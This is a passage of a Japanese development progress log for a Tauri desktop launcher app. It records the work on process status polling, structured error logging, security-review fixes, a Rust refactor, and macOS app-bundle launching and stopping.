- macOS の `.app` は 007/008 が `/usr/bin/open` 経由で起動するため、registry が掴む `Child` は即終了する `open` ヘルパ。010 の `try_wait()` でも即 `stopped` と判定されるため、**起動直後に「停止済み」表示になる**（実アプリは起動しているが監視できない既知縮退）。Windows(`.exe`)/Linux の直接 spawn 経路では `Child` が実プロセスなので `running` を正しく継続表示する（本命ターゲットは Windows）。macOS の実対応は 013 macOS App Bundle Stop

### 追加ライブラリ

- なし（`std::process::Child::try_wait()`（std）と既存 chrono / ts-rs を再利用。新規 crate・plugin・npm package・状態管理ライブラリなし）

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: 変更 `src/process/model.rs`（`RuntimeProcessStatus` / `RuntimeProcess` 追加）・`src/process/service.rs`（`snapshot` 追加。009 の `spawn`/`stop_one` は不変）・`src/process/commands.rs`（`list_runtime_processes` / `list_preset_runtime_processes` 追加）・`src/process/registry.rs`（`started_at` / `preset_item_id` の `#[allow(dead_code)]` 除去。構造体自体は不変）・`src/lib.rs`（handler に command 2本登録）。`error.rs`・`capabilities/default.json` は**変更なし**
- Frontend（`apps/desktop/src/`）: 生成物 `features/presets/bindings/{RuntimeProcess,RuntimeProcessStatus}.ts` / 新規 `features/presets/runtimeApi.ts` / 変更 `features/presets/types.ts`（runtime 型を re-export）・`types.ts`（`ToolState` に `"stopped"`）・`components/primitives.{tsx,module.css}`（`stopped: "停止済み"` ラベルと `.status.stopped` スタイル）・`screens/main/MainScreen.tsx`（`reconcile` / polling / 停止後 `stopped` 表示 / launched・running 合算）。`screens/main/ToolRow.tsx` は変更なし
- Docs: 変更 `docs/progress.md`（本記録）

### 追加した型（API/JSON は camelCase、status enum は lowercase）

- `RuntimeProcessStatus` = `"running" | "stopped" | "error"`（UI の6状態のうち Rust が try_wait で判定できる3状態のみ。`waiting` / `starting` / `stopping` は UI 専用の操作中一時状態）
- `RuntimeProcess { launchId, toolId, toolName, presetId?, presetItemId?, processId, status, startedAt, updatedAt, endedAt?, errorMessage? }`

### 検証結果

- `cargo check` 成功
- `pnpm --filter ./apps/desktop gen:bindings`（`cargo test export_bindings`）成功（19 tests ok。`RuntimeProcess` / `RuntimeProcessStatus` 新規生成）
- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功（59 modules）
- ※ `check:bindings` は生成物が未コミットのため diff で exit 1（＝生成は最新・コミット前という想定どおり）。コミット時に bindings 差分を含める
- ※ `pnpm tauri dev` の実機 E2E（単体起動→「起動中」→約数秒で「起動済み」＋停止ボタン／単体停止→「停止済み」→再起動可／一括起動→成功 running・失敗 error／一括停止→対象 stopped・失敗は起動中へ／起動アプリを OS 側で閉じる→約4秒以内に「停止済み」／プリセット切替・編集で 004〜009 非破壊／macOS `.app` は既知縮退で即 stopped・`.exe`/Linux は running 継続）は表示環境が必要なためユーザー環境での確認を推奨

### セキュリティ確認（docs/security.md 準拠 / process 状態確認処理追加のため security-review 推奨）

- 状態確認は `std::process::Child::try_wait()` のみ（`tasklist` / `ps` / `pgrep` / `cmd /C` / `sh -c` / `powershell` なし・shell 非経由）
- frontend からは何も（`list_runtime_processes`）または `presetId` のみ（`list_preset_runtime_processes`）。任意 PID・path・command で状態確認できない。registry 未登録のプロセスは状態確認対象にしない。ユーザーが手動起動したプロセスは監視しない
- `check_process` / `watch_process` / `list_os_processes` / `get_process_by_pid` / `kill_process` 等の汎用危険 command を追加していない（限定的な `list_runtime_processes` / `list_preset_runtime_processes` のみ）
- Tauri capabilities / permissions 変更なし（自作 command は `core:default` でカバー）
- `errorMessage` は環境変数・フルパス・スタックトレースを含まない固定文言に丸め。ログに機密情報を出さない
- polling は UI 表示中のみ・約4秒間隔（1秒未満の高頻度なし）・IPC のみで外部通信なし・registry のプロセスに限定
- 004〜009 のデータ・既存機能を壊さず、command 2本・モデル2つ・フロント wrapper 1つを追加するのみ（`ToolRow` の分岐や 009 の停止ロジックは不変）

### やっていないこと（今回スコープ外・据え置き）

- アプリ再起動後のプロセス復元・PID だけを使った任意プロセス監視・ユーザー入力 PID の監視・プロセスツリー全体の監視
- 起動完了／ウィンドウ表示完了の厳密検知・CPU / メモリ使用量取得・詳細なログ画面・永続的な起動履歴 DB
- macOS `.app` の実プロセス監視（→ 013 macOS App Bundle Stop）
- 単体起動（007）由来プロセスのプリセット切替を跨いだ復元（preset に紐づかないため。一括起動由来は presetItemId で復元可。単体は同一マウント中のみ launchId で追跡）
- git commit は未実施（指示があってから）

## 2026-07-08 (011 Error Handling / Logs)

### 完了したこと

- ユーザーテストで問題を再現・聞き取り・修正しやすくするため、**統一エラー形式**・**structured log（SQLite `app_logs`）**・**診断 / ログ画面**を追加した（外部送信・telemetry・analytics・crash report・cloud sync は追加していない）
- **エラー型の全面再設計（ユーザー選択）**: `AppError` を enum `{ kind, message }` から **struct `{ code, message, details?, operation?, occurredAt }`** に変更。`ErrorCode` enum（`VALIDATION_ERROR` 等、SCREAMING_SNAKE_CASE）を新設し `AppError.code` と `AppLogEntry.errorCode` で共有。旧変種名に対応するコンストラクタ（`AppError::validation` / `not_found` / `path_not_found` / `duplicate_path` / `duplicate_name` / `duplicate_tool_in_preset` / `launch_failed` / `unsupported_file_type` / `storage` / `internal`）＋ `with_details` / `with_operation` ビルダを用意し、services/commands の全呼び出し（~33 箇所）を機械的に置換
  - frontend で `AppError.kind` に分岐する箇所は無く（`toErrorMessage` は `.message` のみ参照）、wire 変更後も既存のエラー表示は message で動作（コメントのみ更新）
- **機密情報の安全化**（011 の重要目的）:
  - `process::service::spawn` / `tools::service::validate` の `PathNotFound`・`DuplicatePath` が message に**フルパスを連結していた**のを、安全な固定文言に変更し `details` は**ファイル名のみ**（`Path::file_name`）に限定
  - `.lnk` / `.bat` 拒否を `Validation` から `unsupported_file_type`（`UNSUPPORTED_FILE_TYPE` / 「このファイル形式は現在未対応です。」）へ
  - `From<rusqlite::Error>` は生の rusqlite 文字列（DB パスを含みうる）を**frontend にも log にも載せず**、固定文言＋`StorageFailed` に丸め
- **structured log（SQLite `app_logs`）**: 新規 `src/app_logs/{mod,model,repository,service,commands}.rs`（004 の4層パターン踏襲、DbState は `tools::commands::DbState` を再利用、同一 `stream-dock.db` に `app_logs` テーブル追加）。`AppLogEntry { id, level, category, operation, message, errorCode?, toolId?, toolName?, presetId?, presetName?, presetItemId?, launchId?, processId?, occurredAt }`。level=info/warn/error、category=tool/preset/preset-item/process-launch/bulk-launch/process-stop/runtime-status/storage/ui。enum ⇔ DB 文字列は serde_json 経由で naming を単一ソース化
- **ログ取得 command 3本**（限定的な内部ログ取得のみ・危険な汎用 command なし）:
  - `list_app_logs(db, limit?)`: 直近ログを返す。**limit は Rust 側で clamp（既定 50・最大 200）**。任意 SQL / 検索条件は受け取らない
  - `get_diagnostic_summary(db, registry)`: `DiagnosticSummary { generatedAt, appVersion(env!("CARGO_PKG_VERSION")), recentErrors, recentWarnings, runtimeProcesses }`。full path / 環境変数を含めない
  - `clear_app_logs(db)`: ユーザーテストの履歴リセット用
- **既存操作へのログ記録**（spawn/kill 中は DB ロック非保持を守るため、command 層で結果確定後に短時間ロックして記録。ログ失敗は握りつぶす）:
  - `launch_tool` 成功/失敗、`launch_preset` 開始/全成功/一部失敗(`BULK_LAUNCH_PARTIAL_FAILED`)/全失敗(`BULK_LAUNCH_FAILED`)、`stop_process`/`stop_preset_processes`（stopped/already-exited(`PROCESS_ALREADY_EXITED`)/failed(`STOP_FAILED`)）、runtime status の Error 検知(`RUNTIME_STATUS_FAILED`)
  - CRUD（tools/presets/preset_items の create/update/delete/add/remove/reorder）は `log_command_err` を1行追加し、保存処理失敗・validation error を記録
- React 側: 新規 `features/logs/{types,logsApi,useLogs}.ts` ＋ 生成 `features/logs/bindings/`。**コンポーネントは invoke を直接呼ばず API wrapper 経由**（`listAppLogs` / `getDiagnosticSummary` / `clearAppLogs`）
- UI: 新規 `screens/diagnostics/DiagnosticsScreen.tsx`（Screen union に `"diagnostics"` 追加、サイドバー下部の「🩺 診断 / ログ」から開く）。**直近エラー / 簡易ログビュー（発生時刻・level・category・operation・message・関連 Tool/Preset 名・error code を表示）/ 診断サマリー（readonly textarea ＋「コピー」ボタン）**。stack trace / full path / raw Rust error は表示しない。コピーは `navigator.clipboard`（失敗時は textarea select フォールバック）で **capabilities / plugin 追加なし**

### `.gitignore` の修正（要確認）

- ルート `.gitignore` の `logs`（Node のログ出力無視）が **`apps/desktop/src/features/logs/` のソースまで無視**していたため、`!apps/desktop/src/features/logs/` の除外規則を追加した（この feature を版管理・コミット対象にするため）。Rust 側の ts-rs `export_to` パス（`features/logs/bindings/`）はそのまま

### 追加ライブラリ

- なし（既存の rusqlite / uuid / chrono / serde / serde_json / ts-rs を再利用。新規 crate・plugin・npm package なし）

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: 新規 `src/app_logs/{mod,model,repository,service,commands}.rs` / 変更 `src/error.rs`（AppError struct 化・ErrorCode 追加）・`src/lib.rs`（`mod app_logs`・init・handler 3本）・`src/process/{commands,service}.rs`（ログ記録・パス安全化・safe_launch_message 簡素化）・`src/tools/{commands,service}.rs`・`src/presets/{commands,service}.rs`・`src/preset_items/{commands,service}.rs`（コンストラクタ置換・log_command_err）
- Frontend（`apps/desktop/src/`）: 新規 `features/logs/{types,logsApi,useLogs}.ts` ＋ 生成 `features/logs/bindings/*`・`screens/diagnostics/DiagnosticsScreen.{tsx,module.css}` / 変更 `types.ts`・`App.tsx`・`components/Sidebar.tsx`・`features/tools/useTools.ts`（コメント）・生成 `features/tools/bindings/{AppError,ErrorCode}.ts`
- 設定 / docs: `apps/desktop/package.json`（check:bindings に logs/bindings 追加）・`.gitignore`（上記）・`docs/progress.md`（本記録）

### 検証結果

- `cargo check` 成功（warning 0）
- `pnpm gen:bindings`（`cargo test export_bindings`）成功（24 tests ok。ErrorCode / AppLogEntry / DiagnosticSummary / LogLevel / LogCategory を新規生成、AppError を再生成）
- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功（63 modules）
- ※ `check:bindings` は生成物が未コミットのため diff で exit 1（＝生成は最新・コミット前という想定どおり）。コミット時に bindings 差分を含める
- ※ `pnpm tauri dev` の実機 E2E（存在しないパス/.bat/.lnk 起動で安全な message＋ログに `LAUNCH_FAILED`/`UNSUPPORTED_FILE_TYPE`／一括の一部・全失敗ログ／停止失敗・already-exited／validation error・保存失敗ログ／診断画面の直近エラー・ログビュー・サマリーコピー／フルパス非表示／004〜010 非破壊）は表示環境が必要なためユーザー環境での確認を推奨

### セキュリティ確認（docs/security.md 準拠 / 実装後に security-review 推奨）

- ログ保存先は Rust 固定（`stream-dock.db` の `app_logs`）。frontend から任意 path / SQL / 検索条件を渡せない。`list_app_logs` の limit は Rust 側 clamp
- message / details / log に環境変数・stack trace 全文・secret・不要なフルパス・OS ユーザー名を出さない。`path_not_found` はファイル名のみ、DB エラーは固定文言、raw rusqlite 文字列は非永続
- 診断サマリーに full path を出さない（runtimeProcesses は既存のサニタイズ済みフィールドのみ）
- 外部通信 / telemetry / analytics / crash report / cloud sync を追加していない。危険な汎用 command（read_file / write_file / execute_sql 等）を追加していない（限定的な `list_app_logs` / `get_diagnostic_summary` / `clear_app_logs` のみ）
- Tauri capabilities / permissions 変更なし（コピーは webview clipboard、plugin 不要）。004〜010 のデータ・既存機能・DB スキーマは非破壊（別テーブル `app_logs` 追加のみ）

### やっていないこと（今回スコープ外・据え置き）

- 外部送信ログ / telemetry / analytics / crash report / cloud sync / Sentry 連携 / 遠隔ログ収集
- 詳細なログ検索・高度なフィルタリング・永続的な監査ログ基盤・ログローテーション本格実装・OS イベントログ連携
- ログの任意 export（011 では必須にしない）
- git commit は未実施（指示があってから）

## 2026-07-08 (011 フォローアップ: security-review 指摘対応)

### 背景

011 実装後の security-review で以下を検出し、堅牢化（防御的）方針で対応した。

- **Med**: CRUD エラーの `AppError.message`（`duplicate_name` はユーザー入力のプリセット名を埋め込む）が `log_command_err` 経由で `app_logs` に永続化され、Error レベルのため**診断サマリー（開発者へ共有する copy テキスト）にプリセット名が流出**していた。docs/security.md §9「ログに任意ユーザー入力を残さない／共有用サマリーに出さない」に該当。

### 完了したこと

- **Med 修正（CRUD ログの code 由来文言化）**:
  - `error.rs` に `ErrorCode::log_message(&self) -> &'static str` を追加。全 15 code ごとの**ユーザー入力・フルパス・環境情報を含まない静的文言**を返す。ログ／共有サマリー用で、frontend 向けの詳細 `AppError.message` とは役割を分離
  - `app_logs::service::log_command_err` を、`e.message` ではなく **`e.code.log_message()`** を記録するよう変更（`.error_code(e.code)` は維持）。これで CRUD 失敗ログが raw message（＝ユーザー入力）を一切永続化しない構造に
  - `presets::service` の `duplicate_name` message は**変更せず**（frontend には名前入りの詳細文言を返して UX 維持。漏洩はログ側で断ち切る方針）。UUID を含む `not_found` 系メッセージも据え置き（機密でなく、id はデバッグに有用）
- **Low 修正（安全な手当て）**:
  - `DiagnosticsScreen.tsx`: 「コピーしました」表示を戻す `setTimeout` の id を `useRef` に保持し、アンマウント時 `useEffect` cleanup で `clearTimeout`。連打時は張り替え前に前回タイマーをクリア（多重タイマー防止）
  - `app_logs::commands::get_diagnostic_summary` の doc に、`snapshot` の reap 副作用（終了検知プロセスを registry から除去）と db→registry のロック順序（唯一の同時保持箇所）を明記（挙動は不変）

### 変更した主要ファイル

- Rust: `src/error.rs`（`ErrorCode::log_message` 追加）・`src/app_logs/service.rs`（`log_command_err` 変更）・`src/app_logs/commands.rs`（doc 追記）
- Frontend: `src/screens/diagnostics/DiagnosticsScreen.tsx`（timer 後始末）
- docs: `docs/progress.md`（本記録）

### 検証結果

- `cargo check` 成功（warning 0）
- `pnpm --filter ./apps/desktop check:bindings` … `ErrorCode` / `AppError` の wire は不変のため**bindings 差分ゼロ**（impl メソッド追加のみ）
- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- ※ 実機 E2E（既存名プリセットで作成/編集 → frontend は名前入りエラー表示／診断サマリーには `DUPLICATE_NAME` 固定文言のみでプリセット名が出ない／コピー後の画面遷移で警告なし／004〜010 非破壊）は表示環境が必要なためユーザー環境での確認を推奨

### やっていないこと（据え置き・別タスク）

- `AppError.operation` 未設定フィールドの削除／配線（wire に出ているが常に None。害はないため据え置き）
- ログ並び順の tie-break 改善（同一 `occurred_at` は id DESC のため表示順が稀に前後する。機能影響なし）
- process 経路の Info ログ（tool.name 入り）の文言変更（Info はサマリー非対象・structured field は設計どおり）
- git commit は未実施（指示があってから）

## 2026-07-08 (012 Rust Common Helper Refactor)

### 完了したこと

- 004〜011 で各モジュール（tools / presets / preset_items / process / app_logs）に散在していた**同一イディオムの重複コード**を、薄い共通ヘルパ1モジュール `src-tauri/src/util.rs` に抽出し、呼び出し側を機械的に差し替えた。**挙動・検証ルール・メッセージ文言・チェック順序・DB スキーマ・bindings 出力を一切変えない純リファクタ**（下位プリミティブのみ抽出。検証フロー自体は各モジュールに残置）
- 着手前に実コードを `grep` で再スキャンし、012 仕様（007 時点の行番号）とのズレ（011 で AppError が struct 化・path 系メッセージが安全化・now 呼び出しが app_logs/process に増加）を反映した

### 新設した共通ヘルパ（`src-tauri/src/util.rs`・すべて薄く保持）

- `now_rfc3339() -> String` … `chrono::Utc::now().to_rfc3339()` の単一定義
- `normalize_optional(&Option<String>) -> String` … 任意フィールドの trim 正規化（None は空文字）
- `require_non_empty(&str, message) -> AppResult<()>` … trim 後に空なら Validation エラー
- `reject_control_chars(&str, message) -> AppResult<()>` … 制御文字を含めば Validation エラー
- `with_filename_detail(AppError, &Path) -> AppError` … `path_not_found`/`duplicate_path` 共通の「file_name のみを details に付与（フルパス非露出）」定型を集約。付与元の AppError は呼び出し側が渡すため各サイト固有の安全文言は不変

### 差し替え内容（再スキャン済みの正確な位置）

- `now_rfc3339()`: `chrono::Utc::now().to_rfc3339()` の**全17箇所**を置換（`error.rs`・tools/presets/preset_items/process の各 service・`process/commands.rs`・`app_logs/service.rs`）。011 で増えた新規箇所と定義元の `error.rs` も含め single-source 化
- `normalize_optional`: `tools/service.rs`（description/icon_label）・`presets/service.rs`（description）の3箇所
- `reject_control_chars`: `tools/service.rs`（name/executable_path）・`presets/service.rs`（name/description）の4箇所
- `require_non_empty`: service 層の clean な6箇所（tools name/executable_path・presets name・preset_items presetId/toolId・process path_str）
- `with_filename_detail`: `tools/service.rs`（path_not_found / duplicate_path）・`process/service.rs`（path_not_found）の3箇所

### 明示的に触っていないもの（挙動差分・スコープ膨張回避）

- `process/commands.rs` の必須チェック（toolId/presetId/launchId 空チェック）… ログ記録（`log(...)`）が絡む複合処理のため、`require_non_empty` 単純置換だとログ副作用が失われる。挙動不変を守り据え置き
- `process/service.rs` の `enabled.is_empty()`（Vec 空判定・文言別）、`process/commands.rs` の `result.tool_id.is_empty()`（分岐）… 意味が別のため対象外
- 検証ルール・文言・順序の変更／起動時と登録時のパス検証の統合／新機能・新 command・DB スキーマ・bindings 変更／新規ライブラリ・capabilities 追加／React 側変更／trait 化などの過剰抽象化

### 追加ライブラリ

- なし（`chrono`（既存）のみ利用。新規 crate・plugin・npm package なし）

### 変更・作成した主要ファイル

- 新規: `apps/desktop/src-tauri/src/util.rs`（5ヘルパ）
- 変更（Rust）: `src/lib.rs`（`mod util;` 追加）・`src/error.rs`・`src/tools/service.rs`・`src/presets/service.rs`・`src/preset_items/service.rs`・`src/process/service.rs`・`src/process/commands.rs`・`src/app_logs/service.rs`
- 変更（docs）: `docs/progress.md`（本記録）
- React / bindings / capabilities / Cargo.toml / DB スキーマは変更なし

### 検証結果（挙動不変の証跡）

- `cargo check` 成功（warning 0）
- `pnpm --filter ./apps/desktop gen:bindings` 成功（24 tests ok）→ **bindings 生成物に差分ゼロ**（型・wire・挙動が不変であることの証跡）
- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功
- `git diff --stat`: Rust 8ファイル変更 + `util.rs` 新規（45 insertions / 67 deletions）で計画どおりの範囲に収まる
- 挙動差分ゼロの確認: 差し替え前後で各エラー message / details / チェック順序が同一（ヘルパは同一ロジックの機械的抽出。`grep` で `to_rfc3339` / `any(char::is_control)` / `as_deref().unwrap_or` の残存が `util.rs` の定義のみになったことを確認）
- ※ `pnpm tauri dev` の 004〜007 主要動線（Tool CRUD / Preset CRUD / PresetItem 並び替え・ordered/parallel / Tool 単体起動）の実機非破壊確認は表示環境が必要なためユーザー環境で実施

### セキュリティ確認（docs/security.md 準拠・検証強度を下げない）

- 純内部リファクタ。外部通信・危険 command・capabilities・依存追加なし
- 空・制御文字・実在・絶対パス・拡張子拒否の検証はすべて現状の文言・順序のまま維持（ヘルパは同一ロジックの抽出）
- `path_not_found` / `duplicate_path` の details は引き続きファイル名のみ（フルパス非露出）。`safe_launch_message` / `LaunchFailed` 固定文言・ログ方針は不変

### やっていないこと（今回スコープ外・据え置き）

- `process/commands.rs` の必須チェック共通化（ログ副作用があるため据え置き）
- git commit は未実施（指示があってから）

## 2026-07-08 (013 macOS App Bundle Stop)

### 完了したこと

- macOS の `.app` を stream-dock から**実際に停止**できるようにし、あわせて **010 Runtime Status の macOS 誤表示**（起動直後に「停止済み」）も解消した。009/010 は変更せず、起動処理（`spawn`）1点の修正で両方の縮退を根本解消
- **根本原因**（007/008 からの申し送り）: macOS `.app` を `/usr/bin/open` 経由で起動していたため、009 registry が掴む `std::process::Child` が即終了する `open` ヘルパになり、`stop_one` の `try_wait()` が常に `already-exited`（実アプリが止まらない）、`snapshot` の `try_wait()` が即 `Stopped`（起動直後に「停止済み」誤表示）になっていた
- **採用アプローチ = (a) バンドル内実体バイナリの直接 spawn**（ユーザー確定）。macOS `.app` を `/usr/bin/open` ではなく `Contents/MacOS/<CFBundleExecutable>`（実体バイナリ）を `std::process::Command` で直接 spawn するよう `process::service::spawn` の `is_app_bundle` 分岐を変更。掴む `Child` が実アプリになるため、**registry / `stop_one`（kill）/ `snapshot`（try_wait）は無改修**で 009 の停止・010 の状態監視がそのまま効く（Child ベース機構を再利用）
- **(b) を採らなかった理由**: registry・停止・状態がすべて `ManagedProcess.child: Child` 前提のため、open 後に実 PID を照合する (b) は raw PID kill 用の別経路・新規依存・PID 再利用対策が必要で変更面が大きく広がる。(a) は変更が `spawn()` の macOS 分岐1箇所に閉じる
- **CFBundleExecutable の解決**: 新規ヘルパ `resolve_bundle_executable(bundle: &Path) -> AppResult<PathBuf>` を追加。`Contents/Info.plist` を `plist` crate で読み `CFBundleExecutable` を取得 → `Contents/MacOS/<exec>` を組み立て。ディレクトリ走査ヒューリスティックではなく Info.plist を正とすることで、バンドル名 ≠ 実体名のアプリ（例: Visual Studio Code.app → `Electron`）も正確に解決
- **起動時検証（Layer B）は不変**: 空でない / 絶対パス / 実在 / ディレクトリ拒否（`.app` のみ例外）/ `.lnk`・`.bat` 拒否は 007/008 のまま維持（検証強度を下げない）。Windows(`.exe`)/Linux の直接 spawn 経路（`else` 側）は不変

### 追加ライブラリ（理由）

- `plist`（1.x, 実際に解決されたのは 1.10.0）: macOS `.app` の `Contents/Info.plist` から `CFBundleExecutable`（実体バイナリ名）を解決するために追加。XML/バイナリ両 plist に対応した**読み取り専用パーサ**で、network/fs/shell/updater 系の強権限を要求しない。用途は Info.plist の当該キー読み取りに限定（CLAUDE.md「新ライブラリは理由明記」/ security.md §10「依存を増やしすぎない」に沿って最小用途で導入）
- 実体は macOS 分岐からのみ利用。呼び出し側（`if is_app_bundle` ブロック）は全プラットフォームでコンパイルされるため dead_code 警告は出ない（`cargo check` warning 0）

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: `Cargo.toml`（`plist` 追加）・`src/process/service.rs`（`spawn` の macOS 分岐を実体バイナリ直接 spawn に変更・`resolve_bundle_executable` 新規・`PathBuf` import 追加・009 既知縮退の doc を 013 解消済みに更新）
- 触っていない: `process/{registry,commands,model}.rs`（`ManagedProcess.child: Child` / `process_id` は既存のまま流用）・型 bindings（wire 不変）・`capabilities/default.json`・DB スキーマ・React 側・Windows/Linux 経路

### path traversal 防御（security）

- `CFBundleExecutable` は悪意ある `.app` なら任意値を持ちうるため、`resolve_bundle_executable` で **空 / `/` を含む / `..` を含む値を拒否**し、`Contents/MacOS/` 直下の**実在する通常ファイル**（`is_file()`）に限定。バンドル外・親ディレクトリへの脱出を防ぐ
- 解決失敗・plist 破損・実体不在はいずれもフルパスや plist 内容を露出させず固定文言 `launch_failed`（「プロセスの起動に失敗しました」）に丸め（`spawn` の他エラー・`with_filename_detail` のサニタイズ方針と整合）

### 検証結果

- `cargo check` 成功（warning 0。`plist` 1.10.0 のコンパイル込み）
- `cargo test export_bindings` 成功（24 tests ok）→ **bindings 生成物に差分ゼロ**（型・wire・挙動が不変であることの証跡。`gen:bindings` のコミット不要）
- `pnpm --filter ./apps/desktop typecheck` 成功（exit 0）
- `pnpm --filter ./apps/desktop lint` 成功（exit 0 / warning なし）
- `pnpm --filter ./apps/desktop build`（tsc && vite build）成功（63 modules）
- ※ `pnpm tauri dev` の macOS 実機 E2E（`.app` を起動 → 単体停止 / Preset 単位停止で実アプリが終了する ／ 起動後に Runtime Status が「起動済み(running)」を継続表示し実アプリ終了時に「停止済み」へ遷移する ／ Electron 系など bundle 名 ≠ exec 名の `.app` でも起動・停止できる ／ 存在しないパス・非 .app ディレクトリ・.bat は従来どおりエラー ／ Windows・Linux 経路〈004〜010〉が非破壊）は表示環境が必要なためユーザー環境での確認を推奨

### セキュリティ確認（docs/security.md 準拠 / 起動処理変更のため security-review 必須）

- shell 非経由: `/usr/bin/open` を廃し `Command::new(<exec>)` の直接 spawn。`sh -c` / `open` のシェル展開なし・文字列連結でコマンド生成なし・path は配列（`Command::new`）で明示、追加引数なし
- frontend からは toolId / presetId のみ。任意 path / command を渡せない。exec の解決元は登録済み `executablePath`（Layer A/B 検証済み）配下の Info.plist に限定
- path traversal 防御（上記）でバンドル外実行を防止。情報漏洩なし（固定文言に丸め）
- 停止・状態は不変（`stop_one` の `kill` / `snapshot` の `try_wait` は無改修で registry 内プロセス限定）。raw PID kill・プロセスツリー停止・常時死活監視は追加していない
- Tauri capabilities / permissions 変更なし・外部通信追加なし・危険な汎用 command 追加なし・DB スキーマ不変

### やっていないこと / 既知の残課題（今回スコープ外・据え置き）

- **LaunchServices 非経由による挙動差**: 単一インスタンス制御・アクティベーション・既起動アプリの再アクティブ化が効かず、直接 spawn は常に新インスタンスを起動しうる（streaming ツール用途では許容範囲と判断。バンドル内 exec を起動するため `NSBundle.mainBundle` 等のバンドル文脈自体は正しく解決される）
- graceful shutdown・プロセスツリー全体停止・常時死活監視ループ・OS/アプリ再起動後のプロセス復元
- git commit は未実施（指示があってから）

## 2026-07-08 (013 修正 v2: 直接spawn退行の是正 / open起動＋実PID方式へ)

### 背景（v1 の退行）

013 v1（直接 spawn 方式）の macOS 実機 E2E で、`/System/Applications/Calendar.app` を起動すると
**「Calendar が予期しない理由で終了しました」というクラッシュ**が発生した。クラッシュレポートの要点:
`Exception Type: EXC_CRASH (SIGKILL (Code Signature Invalid))` / `_dyld_start` / `dyld_path_missing` /
`main_executable_path_missing` / `dyld_process_snapshot_get_shared_cache failed` / `Parent Process: stream-dock`。

### 根本原因（approach (a) 自体の限界・実装バグではない）

`.app` の実体 Mach-O バイナリ（`Contents/MacOS/<CFBundleExecutable>`）を `std::process::Command` で
**直接 exec すると LaunchServices を通らず**、macOS の **launch constraints（起動制約, macOS 13+）と
コード署名の起動コンテキスト検証**に違反する。Apple システムアプリ（`/System/Applications/` 配下）は
「launchd/LaunchServices からのみ起動可」の制約を持つため、親プロセスが stream-dock だとカーネルが
即 SIGKILL する。→ **`.app` の汎用起動には `/usr/bin/open`（LaunchServices）が必須**で、直接 spawn は不採用。

### 完了したこと（open 起動へ差し戻し ＋ 実 PID 方式で 009/010 を達成）

- **起動を `/usr/bin/open` に戻す**（007/008 と同じ・全アプリで安定。system/サードパーティ両方が起動可）。
  固定絶対パス・バンドルパスは配列引数（shell 非経由・文字列連結なし）。
- **実アプリ PID を同定して registry に載せる（approach b・ユーザー確定）**: `open` 実行の前後で
  「exe の親が `<bundle>/Contents/MacOS` の実行中プロセス」の PID 集合を差分（before/after）し、
  **新規に現れた PID を優先採用**（最大 ~2 秒ポーリング）。新規が出ない再アクティブ化時は既存一致 PID を採用。
  同定時の exe 絶対パスを **PID 再利用ガード**用に保持する。
- **停止（009）**: macOS `.app` は保持 PID が生存かつ exe 一致なら `sysinfo` で kill（SIGKILL）。exe 不一致・
  不在なら「既終了」扱いで**絶対に kill しない**（PID 再利用による他プロセス停止を防止）。shell 非経由。
- **状態（010）**: macOS `.app` は保持 PID の生存＋exe 一致で `Running` / それ以外 `Stopped`。これにより
  「起動直後に停止済み」と「停止しても止まらない」の両縮退が解消。
- **registry ハンドルの一般化**: `ManagedProcess.child: Child` → `child: Option<Child>` ＋ `exe_path: Option<PathBuf>`。
  Windows/Linux/非バンドルは従来どおり `child = Some(...)`（`try_wait`/`kill`/`wait` は挙動不変）。macOS `.app` は
  `child = None` ＋ PID/exe で管理。enum ではなく Option にして非 macOS の未構築 variant による dead_code を回避。
- **spawn の戻りを一般化**: `spawn(&Tool) -> AppResult<Spawned { process_id, child, exe_path }>`。
  `register` も `Spawned` を受け取る形に変更（`launch_tool` / `launch_one` の呼び出しを更新）。起動時検証
  （空/絶対パス/実在/ディレクトリ拒否〈.app 例外〉/`.lnk`・`.bat` 拒否）は 007/008 から不変。
- v1 で入れた**直接 spawn 分岐・`resolve_bundle_executable`・`plist` 依存は撤去**。

### 依存の変更（理由）

- **撤去**: `plist`（v1 で追加）。open 起動＋PID 同定では Info.plist を読む必要がないため。
- **追加**: `sysinfo`（0.39, **macOS 限定ターゲット依存** `[target.'cfg(target_os = "macos")'.dependencies]`）。
  用途は「自分が `open` で起動した実アプリの PID 解決・生存確認・kill」に限定。Windows/Linux ビルドには
  載せない（014 Windows Build に影響しない）。全使用箇所を `#[cfg(target_os = "macos")] mod macos` に閉じる。

### 変更・作成した主要ファイル

- Rust（`apps/desktop/src-tauri/`）: `Cargo.toml`（plist 撤去・sysinfo を macOS 限定で追加）・
  `src/process/service.rs`（`Spawned` / open 起動＋PID 同定 `macos::launch_app_bundle` / `stop_by_pid` /
  `is_running` / `stop_one` と `snapshot` を Option<Child>＋PID 両対応化 / register シグネチャ変更 /
  v1 の直接 spawn・resolve_bundle_executable を撤去）・`src/process/registry.rs`（`ManagedProcess` の
  `child: Option<Child>` 化・`exe_path` 追加）・`src/process/commands.rs`（`launch_tool` を Spawned 前提に更新）
- 触っていない: `process/model.rs` と型 bindings（`process_id: u32` を維持＝**wire 不変**）・
  `capabilities/default.json`・DB スキーマ・React 側・Windows/Linux 経路（`child = Some`）

### 検証結果

- `cargo check` 成功（sysinfo 0.39.5 込みで warning 0）
- `cargo test export_bindings` 成功（24 tests）→ **bindings 差分ゼロ**（wire 不変・`gen:bindings` コミット不要）
- `pnpm --filter ./apps/desktop typecheck` / `lint` / `build`（tsc && vite build）すべて成功
- ※ 非 macOS ビルドは当環境（darwin）で実行不可。sysinfo と全使用箇所が `#[cfg(target_os = "macos")]` に
  漏れなく閉じている（`mod macos` 内のみ）ことをコードレビューで担保
- ※ 実機 E2E（macOS・ユーザー環境）で以下を確認予定: **Calendar.app がクラッシュせず起動**（v1 退行解消）/
